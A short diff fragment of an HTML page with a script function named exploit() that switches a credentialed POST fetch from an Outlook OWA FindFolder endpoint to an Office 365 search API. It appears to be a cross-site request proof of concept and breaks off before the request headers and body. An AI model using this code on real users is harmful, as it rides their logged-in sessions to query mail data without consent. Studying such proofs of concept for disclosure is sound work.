@@ -11,7 +11,7 @@
 
   <script>
     function exploit() {
-      fetch("https://outlook.office365.com/owa/service.svc?action=FindFolder&app=Mail&n=43", {
+      fetch("https://outlook.office365.com/searchservice/api/v2/query?n=91", {
         method: "POST",
         credentials: "include",
         headers: {
